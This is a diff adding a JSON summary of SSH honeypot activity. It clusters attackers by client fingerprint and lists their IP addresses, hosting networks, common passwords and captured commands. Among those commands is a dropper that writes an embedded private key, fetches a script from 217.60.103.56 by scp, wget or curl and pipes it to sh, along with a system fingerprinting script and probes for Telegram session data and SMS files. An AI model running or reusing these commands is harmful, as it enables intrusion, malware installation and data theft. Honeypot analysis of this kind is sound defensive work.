@@ -1,0 +1,783 @@
+{
+ "clustering": {
+  "note": "Sessions partition exactly: every session carries at most one hassh. Addresses do not — some present more than one client build — so an address may appear in several clusters and the count of addresses across clusters can exceed the number of addresses seen.",
+  "problems": [],
+  "reconciles": true,
+  "sessions_in_unlisted_clusters": 18,
+  "signal": "hassh — the SSH client's key-exchange fingerprint",
+  "unit": "session"
+ },
+ "clusters": [
+  {
+   "address_count": 9,
+   "addresses": [
+    "109.160.32.19",
+    "109.160.32.34",
+    "109.160.32.43",
+    "109.160.32.47",
+    "109.160.32.67",
+    "109.160.32.79",
+    "109.160.32.85",
+    "47.80.13.176",
+    "47.84.139.78"
+   ],
+   "clients": [
+    "SSH-2.0-Go"
+   ],
+   "commands": [
+    "uname -s -v -n -r -m"
+   ],
+   "countries": [
+    "KR",
+    "SG",
+    "US"
+   ],
+   "credential_pairs": 1140,
+   "events": 73790,
+   "first_seen": "2026-09-14 09:00:09.573100",
+   "hassh": "0a07365cc01fa9fc82608ba4019af499",
+   "is_campaign": true,
+   "last_seen": "2026-09-16 01:24:44.374660",
+   "networks": [
+    "Alibaba (US) Technology Co., Ltd."
+   ],
+   "sessions": 9234
+  },
+  {
+   "address_count": 5,
+   "addresses": [
+    "106.13.98.129",
+    "118.145.118.102",
+    "157.10.198.167",
+    "206.123.140.188",
+    "74.121.190.250"
+   ],
+   "clients": [
+    "SSH-2.0-Go"
+   ],
+   "commands": [
+    "echo xsec",
+    "id -u && echo '---CHECK_SEP---' && uname -a",
+    "id -u && echo '---OS_RELEASE---' && cat /etc/os-release && echo '---UNAME---' && uname -a",
+    "whoami"
+   ],
+   "countries": [
+    "CN",
+    "DE",
+    "US",
+    "VN"
+   ],
+   "credential_pairs": 2408,
+   "events": 26710,
+   "first_seen": "2026-09-14 07:31:15.476681",
+   "hassh": "98ddc5604ef6a1006a2b49a58759fbe6",
+   "is_campaign": true,
+   "last_seen": "2026-09-15 18:23:39.660772",
+   "networks": [
+    "Beijing Baidu Netcom Science and Technology Co., Ltd.",
+    "Beijing Volcano Engine Technology Co., Ltd.",
+    "LLC Rusbuilding",
+    "VIET DIGITAL TECHNOLOGY LIABILITY COMPANY",
+    "Wowrack.com"
+   ],
+   "sessions": 3340
+  },
+  {
+   "address_count": 10,
+   "addresses": [
+    "130.12.180.51",
+    "164.90.201.51",
+    "165.227.197.28",
+    "2.57.122.238",
+    "35.187.231.181",
+    "45.148.10.183",
+    "77.239.124.176",
+    "77.239.124.179",
+    "77.239.124.183",
+    "87.236.176.32"
+   ],
+   "clients": [
+    "SSH-2.0-Go"
+   ],
+   "commands": [
+    "/bin/./uname -s -v -n -r -m",
+    "echo SHELL_TEST",
+    "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ\n0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg\nAAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9\nCp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=\n-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no\nUserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh"
+   ],
+   "countries": [
+    "AD",
+    "FR",
+    "GB",
+    "NL",
+    "SG",
+    "US"
+   ],
+   "credential_pairs": 187,
+   "events": 1607,
+   "first_seen": "2026-09-14 16:19:22.113753",
+   "hassh": "16443846184eafde36765c9bab2f4397",
+   "is_campaign": true,
+   "last_seen": "2026-09-15 21:55:15.104152",
+   "networks": [
+    "BANATSYNC SRL",
+    "DigitalOcean, LLC",
+    "Driftnet Ltd",
+    "Google LLC",
+    "Omegatech LTD",
+    "TECHOFF SRV LIMITED",
+    "UNMANAGED LTD"
+   ],
+   "sessions": 203
+  },
+  {
+   "address_count": 3,
+   "addresses": [
+    "193.46.255.86",
+    "2.57.121.112",
+    "2.57.121.25"
+   ],
+   "clients": [
+    "SSH-2.0-PuTTY_Release_0.84"
+   ],
+   "commands": [],
+   "countries": [
+    "GB"
+   ],
+   "credential_pairs": 77,
+   "events": 385,
+   "first_seen": "2026-09-15 01:10:03.793159",
+   "hassh": "3356ae6145fa86124298066e281ea2d9",
+   "is_campaign": true,
+   "last_seen": "2026-09-16 10:30:57.730345",
+   "networks": [
+    "UNMANAGED LTD"
+   ],
+   "sessions": 77
+  },
+  {
+   "address_count": 1,
+   "addresses": [
+    "139.19.117.130"
+   ],
+   "clients": [
+    "SSH-2.0-Go"
+   ],
+   "commands": [],
+   "countries": [
+    "DE"
+   ],
+   "credential_pairs": 1,
+   "events": 320,
+   "first_seen": "2026-09-14 08:47:27.906259",
+   "hassh": "f1e5e9d24e5e345e8745613bde22d532",
+   "is_campaign": false,
+   "last_seen": "2026-09-16 06:14:38.264460",
+   "networks": [
+    "Verein zur Foerderung eines Deutschen Forschungsnetzes e.V."
+   ],
+   "sessions": 41
+  },
+  {
+   "address_count": 12,
+   "addresses": [
+    "103.203.57.2",
+    "103.203.59.9",
+    "109.160.32.19",
+    "109.160.32.34",
+    "109.160.32.43",
+    "109.160.32.47",
+    "109.160.32.67",
+    "109.160.32.79",
+    "109.160.32.85",
+    "165.22.145.25",
+    "66.240.223.208",
+    "66.240.236.116"
+   ],
+   "clients": [
+    "SSH-2.0-Go"
+   ],
+   "commands": [],
+   "countries": [
+    "CN",
+    "US"
+   ],
+   "credential_pairs": 0,
+   "events": 52,
+   "first_seen": "2026-09-14 13:06:26.955026",
+   "hassh": "084386fa7ae5039bcf6f07298a05a227",
+   "is_campaign": true,
+   "last_seen": "2026-09-16 02:34:58.926615",
+   "networks": [
+    "Beijing Tiantexin Tech. Co., Ltd.",
+    "CariNet, Inc.",
+    "DigitalOcean, LLC"
+   ],
+   "sessions": 13
+  },
+  {
+   "address_count": 11,
+   "addresses": [
+    "147.185.132.216",
+    "147.185.132.9",
+    "198.235.24.106",
+    "198.235.24.128",
+    "198.235.24.246",
+    "198.235.24.252",
+    "198.235.24.33",
+    "205.210.31.13",
+    "205.210.31.184",
+    "205.210.31.46",
+    "205.210.31.90"
+   ],
+   "clients": [
+    "SSH-2.0-ZGrab ZGrab SSH Survey"
+   ],
+   "commands": [],
+   "countries": [
+    "US"
+   ],
+   "credential_pairs": 0,
+   "events": 44,
+   "first_seen": "2026-09-14 10:07:51.004342",
+   "hassh": "dd9bcf093c355da7000132131cb36fd0",
+   "is_campaign": true,
+   "last_seen": "2026-09-16 10:35:43.162310",
+   "networks": [
+    "Google LLC"
+   ],
+   "sessions": 11
+  },
+  {
+   "address_count": 1,
+   "addresses": [
+    "2.57.122.168"
+   ],
+   "clients": [
+    "SSH-2.0-Go"
+   ],
+   "commands": [
+    "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\")\narch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\")\nuptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null)\ncpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null)\ncpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 )\ngpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null )\nlast_output=$(last 2>/dev/null)\nfilter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'execute_err='; out=$(bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' \"$out\" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; echo '===DONE===' ) 2>&1 )\necho \"UNAME:$uname\"\necho \"ARCH:$arch\"\necho \"UPTIME:$uptime\"\necho \"CPUS:$cpus\"\necho \"CPU_MODEL:$cpu_model\"\necho \"GPU:$gpu_info\"\necho \"LAST:$last_output\"\necho \"FILTER:$filter_output\""
+   ],
+   "countries": [
+    "NL"
+   ],
+   "credential_pairs": 8,
+   "events": 61,
+   "first_seen": "2026-09-15 20:33:59.785506",
+   "hassh": "2ec37a7cc8daf20b10e1ad6221061ca5",
+   "is_campaign": false,
+   "last_seen": "2026-09-15 20:56:49.992751",
+   "networks": [
+    "UNMANAGED LTD"
+   ],
+   "sessions": 8
+  },
+  {
+   "address_count": 6,
+   "addresses": [
+    "116.177.172.64",
+    "172.236.228.197",
+    "34.76.186.10",
+    "34.77.16.133",
+    "35.195.203.14",
+    "50.6.227.30"
+   ],
+   "clients": [
+    "SSH-2.0-Fingerprintx-SSH2",
+    "SSH-2.0-Go"
+   ],
+   "commands": [
+    "uname -a"
+   ],
+   "countries": [
+    "BE",
+    "CN",
+    "US"
+   ],
+   "credential_pairs": 2,
+   "events": 40,
+   "first_seen": "2026-09-14 09:08:01.860739",
+   "hassh": "4e066189c3bbeec38c99b1855113733a",
+   "is_campaign": true,
+   "last_seen": "2026-09-16 10:24:39.454690",
+   "networks": [
+    "Akamai Technologies, Inc.",
+    "CHINA UNICOM China169 Backbone",
+    "Google LLC",
+    "Oracle Corporation"
+   ],
+   "sessions": 8
+  },
+  {
+   "address_count": 6,
+   "addresses": [
+    "151.243.212.58",
+    "157.230.212.252",
+    "192.248.150.180",
+    "3.129.187.38",
+    "47.80.13.176",
+    "47.84.139.78"
+   ],
+   "clients": [
+    "SSH-2.0-Go"
+   ],
+   "commands": [],
+   "countries": [
+    "GB",
+    "KR",
+    "NL",
+    "SG",
+    "US"
+   ],
+   "credential_pairs": 0,
+   "events": 28,
+   "first_seen": "2026-09-14 08:57:28.594024",
+   "hassh": "e54ef3ec27fe1fea7ab64d3fa05359fd",
+   "is_campaign": true,
+   "last_seen": "2026-09-16 08:48:45.568573",
+   "networks": [
+    "Alibaba (US) Technology Co., Ltd.",
+    "Amazon.com, Inc.",
+    "DigitalOcean, LLC",
+    "HOSTKEY B.V.",
+    "The Constant Company, LLC"
+   ],
+   "sessions": 7
+  },
+  {
+   "address_count": 4,
+   "addresses": [
+    "193.47.62.69",
+    "45.148.10.151",
+    "45.148.10.157",
+    "62.60.130.253"
+   ],
+   "clients": [
+    "SSH-2.0-PUTTY"
+   ],
+   "commands": [],
+   "countries": [
+    "AD",
+    "GB"
+   ],
+   "credential_pairs": 0,
+   "events": 24,
+   "first_seen": "2026-09-14 10:06:16.887374",
+   "hassh": "5bd26477da5440a6187bd3f1b39a429c",
+   "is_campaign": true,
+   "last_seen": "2026-09-16 07:05:59.654522",
+   "networks": [
+    "BestDC Limited",
+    "CIPHER OPERATIONS DOO BEOGRAD - NOVI BEOGRAD",
+    "TECHOFF SRV LIMITED"
+   ],
+   "sessions": 6
+  },
+  {
+   "address_count": 1,
+   "addresses": [
+    "130.211.104.162"
+   ],
+   "clients": [
+    "SSH-2.0-Nmap-SSH2-Hostkey"
+   ],
+   "commands": [],
+   "countries": [
+    "BE"
+   ],
+   "credential_pairs": 0,
+   "events": 24,
+   "first_seen": "2026-09-14 09:08:05.129466",
+   "hassh": "e788c657d1a22971d5026526ffd2e918",
+   "is_campaign": false,
+   "last_seen": "2026-09-14 09:08:08.127647",
+   "networks": [
+    "Google LLC"
+   ],
+   "sessions": 6
+  },
+  {
+   "address_count": 5,
+   "addresses": [
+    "115.190.235.8",
+    "115.190.248.35",
+    "119.6.54.138",
+    "154.201.86.249",
+    "222.223.177.118"
+   ],
+   "clients": [
+    "SSH-2.0-Go"
+   ],
+   "commands": [
+    "uname -s -m"
+   ],
+   "countries": [
+    "CN",
+    "HK"
+   ],
+   "credential_pairs": 2,
+   "events": 36,
+   "first_seen": "2026-09-14 18:42:15.154661",
+   "hassh": "98f63c4d9c87edbd97ed4747fa031019",
+   "is_campaign": true,
+   "last_seen": "2026-09-15 17:54:55.732058",
+   "networks": [
+    "Beijing Volcano Engine Technology Co., Ltd.",
+    "CHINA UNICOM China169 Backbone",
+    "Chinanet",
+    "cognetcloud INC"
+   ],
+   "sessions": 5
+  },
+  {
+   "address_count": 3,
+   "addresses": [
+    "34.76.186.10",
+    "34.77.16.133",
+    "35.195.203.14"
+   ],
+   "clients": [
+    "SSH-2.0-Go"
+   ],
+   "commands": [],
+   "countries": [
+    "BE"
+   ],
+   "credential_pairs": 1,
+   "events": 15,
+   "first_seen": "2026-09-14 09:08:02.176251",
+   "hassh": "dde267e50f82fcc16a7e1e7b59b8af71",
+   "is_campaign": true,
+   "last_seen": "2026-09-16 07:27:52.544617",
+   "networks": [
+    "Google LLC"
+   ],
+   "sessions": 3
+  },
+  {
+   "address_count": 3,
+   "addresses": [
+    "163.176.172.27",
+    "176.193.4.96",
+    "74.206.154.51"
+   ],
+   "clients": [
+    "SSH-2.0-libssh2_1.11.1"
+   ],
+   "commands": [
+    "/ip cloud print",
+    "cat /proc/cpuinfo",
+    "echo Hi | cat -n",
+    "ifconfig",
+    "locate D877F783D5D3EF8Cs",
+    "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+    "ps -ef | grep '[Mm]iner'",
+    "ps | grep '[Mm]iner'",
+    "uname -a"
+   ],
+   "countries": [
+    "BR",
+    "CA",
+    "RU"
+   ],
+   "credential_pairs": 2,
+   "events": 102,
+   "first_seen": "2026-09-14 17:01:20.149973",
+   "hassh": "f45fb203c31069bb280067b71ed92ccb",
+   "is_campaign": true,
+   "last_seen": "2026-09-15 16:14:54.377838",
+   "networks": [
+    "Access Communications  Co-operative Limited",
+    "Oracle Corporation",
+    "PJSC MegaFon"
+   ],
+   "sessions": 3
+  }
+ ],
+ "clusters_not_listed": 13,
+ "command_signatures": [
+  {
+   "clusters": [
+    "0a07365cc01fa9fc82608ba4019af499"
+   ],
+   "command": "uname -s -v -n -r -m",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 9,
+   "times": 9207,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "98ddc5604ef6a1006a2b49a58759fbe6"
+   ],
+   "command": "echo xsec",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 3,
+   "times": 3327,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "16443846184eafde36765c9bab2f4397"
+   ],
+   "command": "/bin/./uname -s -v -n -r -m",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 4,
+   "times": 178,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "16443846184eafde36765c9bab2f4397"
+   ],
+   "command": "echo SHELL_TEST",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 1,
+   "times": 18,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "2ec37a7cc8daf20b10e1ad6221061ca5"
+   ],
+   "command": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\")\narch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\")\nuptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null)\ncpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null)\ncpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 )\ngpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null )\nlast_output=$(last 2>/dev/null)\nfilter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'execute_err='; out=$(bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' \"$out\" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; echo '===DONE===' ) 2>&1 )\necho \"UNAME:$uname\"\necho \"ARCH:$arch\"\necho \"UPTIME:$uptime\"\necho \"CPUS:$cpus\"\necho \"CPU_MODEL:$cpu_model\"\necho \"GPU:$gpu_info\"\necho \"LAST:$last_output\"\necho \"FILTER:$filter_output\"",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 1,
+   "times": 7,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "4e066189c3bbeec38c99b1855113733a",
+    "f45fb203c31069bb280067b71ed92ccb"
+   ],
+   "command": "uname -a",
+   "exclusive_to_one_cluster": false,
+   "source_addresses": 5,
+   "times": 5,
+   "used_by_clusters": 2
+  },
+  {
+   "clusters": [
+    "98f63c4d9c87edbd97ed4747fa031019"
+   ],
+   "command": "uname -s -m",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 4,
+   "times": 4,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "98ddc5604ef6a1006a2b49a58759fbe6"
+   ],
+   "command": "whoami",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 1,
+   "times": 4,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "f45fb203c31069bb280067b71ed92ccb"
+   ],
+   "command": "/ip cloud print",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 3,
+   "times": 3,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "f45fb203c31069bb280067b71ed92ccb"
+   ],
+   "command": "cat /proc/cpuinfo",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 3,
+   "times": 3,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "f45fb203c31069bb280067b71ed92ccb"
+   ],
+   "command": "echo Hi | cat -n",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 3,
+   "times": 3,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "98ddc5604ef6a1006a2b49a58759fbe6"
+   ],
+   "command": "id -u && echo '---CHECK_SEP---' && uname -a",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 1,
+   "times": 3,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "f45fb203c31069bb280067b71ed92ccb"
+   ],
+   "command": "ifconfig",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 3,
+   "times": 3,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "f45fb203c31069bb280067b71ed92ccb"
+   ],
+   "command": "locate D877F783D5D3EF8Cs",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 3,
+   "times": 3,
+   "used_by_clusters": 1
+  },
+  {
+   "clusters": [
+    "f45fb203c31069bb280067b71ed92ccb"
+   ],
+   "command": "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+   "exclusive_to_one_cluster": true,
+   "source_addresses": 3,
+   "times": 3,
+   "used_by_clusters": 1
+  }
+ ],
+ "credential_reuse": {
+  "exclusive_passwords": 1844,
+  "shared_passwords": 199
+ },
+ "exposure": {
+  "first_attacker_event": "2026-09-14 07:31:15.476681",
+  "minutes_to_first_attacker": 57.2,
+  "sensor_live_source": "~/JC deployment record: honeypot opened to the internet (Phase 5 Stage B), validated 06:34 UTC",
+  "sensor_live_utc": "2026-09-14 06:34:00"
+ },
+ "meta": {
+  "sanitised_values": {},
+  "schema_version": 1,
+  "source_snapshot": "snapshot-2026-09-16.json",
+  "top_n": 15,
+  "window_end": "2026-09-16 10:40:53.206897",
+  "window_start": "2026-09-14 05:57:05.761100"
+ },
+ "most_shared_passwords": [
+  {
+   "attempts": 78,
+   "password": "admin",
+   "source_addresses": 19,
+   "used_by_clusters": 6
+  },
+  {
+   "attempts": 248,
+   "password": "1234",
+   "source_addresses": 15,
+   "used_by_clusters": 5
+  },
+  {
+   "attempts": 100,
+   "password": "12345",
+   "source_addresses": 16,
+   "used_by_clusters": 5
+  },
+  {
+   "attempts": 697,
+   "password": "123456",
+   "source_addresses": 15,
+   "used_by_clusters": 4
+  },
+  {
+   "attempts": 310,
+   "password": "123",
+   "source_addresses": 13,
+   "used_by_clusters": 4
+  },
+  {
+   "attempts": 162,
+   "password": "12345678",
+   "source_addresses": 12,
+   "used_by_clusters": 4
+  },
+  {
+   "attempts": 43,
+   "password": "test",
+   "source_addresses": 11,
+   "used_by_clusters": 4
+  },
+  {
+   "attempts": 31,
+   "password": "Admin@123",
+   "source_addresses": 11,
+   "used_by_clusters": 4
+  },
+  {
+   "attempts": 12,
+   "password": "support",
+   "source_addresses": 11,
+   "used_by_clusters": 4
+  },
+  {
+   "attempts": 119,
+   "password": "root",
+   "source_addresses": 11,
+   "used_by_clusters": 3
+  },
+  {
+   "attempts": 94,
+   "password": "123456789",
+   "source_addresses": 12,
+   "used_by_clusters": 3
+  },
+  {
+   "attempts": 61,
+   "password": "1qaz@WSX",
+   "source_addresses": 10,
+   "used_by_clusters": 3
+  },
+  {
+   "attempts": 46,
+   "password": "123123",
+   "source_addresses": 9,
+   "used_by_clusters": 3
+  },
+  {
+   "attempts": 43,
+   "password": "P@ssw0rd",
+   "source_addresses": 10,
+   "used_by_clusters": 3
+  },
+  {
+   "attempts": 37,
+   "password": "111111",
+   "source_addresses": 12,
+   "used_by_clusters": 3
+  }
+ ],
+ "no_handshake": {
+  "addresses_that_never_handshook": 110,
+  "addresses_with_such_a_session": 134,
+  "countries": 36,
+  "sessions": 232
+ },
+ "shape": {
+  "addresses_in_several_clusters": 13,
+  "addresses_with_fingerprint": 84,
+  "commands_run": 12780,
+  "fingerprints": 28
+ },
+ "virustotal": {
+  "hashes": [
+   "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb",
+   "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+  ],
+  "reason": "no VT_API_KEY in .env or the environment; re-run once a key is configured",
+  "status": "skipped"
+ }
+}
